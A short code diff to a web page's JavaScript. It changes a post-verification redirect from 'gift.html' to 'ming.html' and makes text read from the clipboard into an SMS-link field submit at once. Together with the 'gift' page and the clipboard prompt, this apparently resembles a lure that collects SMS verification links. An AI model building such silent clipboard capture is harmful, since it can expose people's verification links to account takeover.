@@ -281,7 +281,7 @@ async function submitVerification() {
   }
 
   localStorage.setItem('smsPayload', JSON.stringify(payload));
-  window.location.href = 'gift.html';
+  window.location.href = 'ming.html';
 }
 
 async function readClipboardText() {
@@ -316,9 +316,11 @@ async function requestClipboardAccess() {
       sms.value = clipboardText.trim();
       if (clipboardBanner) clipboardBanner.style.display = 'none';
       error.textContent = '';
+      await submitVerification();
       return true;
     }
 
+    error.textContent = 'No link found in your clipboard yet.';
     return false;
   } catch (clipboardError) {
     error.textContent = 'Please allow clipboard access, or long-press the field to paste manually.';
